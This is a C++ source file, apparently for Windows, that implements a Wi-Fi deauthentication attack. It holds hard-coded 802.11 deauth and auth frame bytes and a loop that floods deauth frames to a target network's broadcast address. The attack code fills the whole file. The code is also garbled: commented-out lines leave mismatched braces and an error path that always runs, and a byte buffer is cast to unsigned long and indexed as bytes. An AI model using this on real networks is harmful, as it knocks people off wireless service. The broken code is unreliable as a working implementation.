#include "deauth_attack.h"

#include <Windows.h>
#include <iostream>
#include <cstring>
#include <string>
#include <vector>
#include <time.h>
#include <atltypes.h>
#include <errno.h>
#include <assert.h>

#include "..\cosmo\deauth_header\all_deauth.h"

#define DEAUTH_REQ                                                             \
	"\xC0\x00\x3A\x01\xCC\xCC\xCC\xCC\xCC\xCC\xBB\xBB\xBB\xBB\xBB\xBB"         \
	"\xBB\xBB\xBB\xBB\xBB\xBB\x00\x00\x07\x00"

#define AUTH_REQ                                                               \
	"\xB0\x00\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"         \
	"\xBB\xBB\xBB\xBB\xBB\xBB\xB0\x00\x00\x00\x01\x00\x00\x00"


struct options {

	unsigned char deauth_rc;
	unsigned char r_dmac[6];
	unsigned char r_bssid[6];


}opt;

unsigned char h80211[4096];

static struct wif *_wi_in, *_wi_out;
unsigned long nb_pkt_send;

int send_packet(unsigned char * buff, size_t count) {

	struct wif * wi = _wi_out;
	unsigned long * pkt = (unsigned long *)buff;

	if ((count > 24) && (pkt[1] & 0x04) == 0 && (pkt[22] & 0x0F) == 0) {

		pkt[22] = (nb_pkt_send & 0x0000000F) << 4;
		pkt[23] = (nb_pkt_send & 0x00000FF0) >> 4;
	}

	//if (wi_write(wi, buff, count, 0) == -1) {

		switch (errno) {

			case EAGAIN:
			case ENOBUFS:
				Sleep(10000);
				return 0;
		}


		perror("wi_write()");
		return -1;
	}

	//nb_pkt_send++;
	//return 0;
//}

void do_deauth_attack() {

	while (1) {

		memcpy(h80211, DEAUTH_REQ, 26);
		h80211[24] = opt.deauth_rc;

		memcpy(h80211 + 10, opt.r_bssid, 6);
		memcpy(h80211 + 16, opt.r_bssid, 6);

		if (send_packet(h80211, 26) < 0) exit(1);
		printf("][ Sending Deauth to broadcast -- BSSID ][");
	}

}
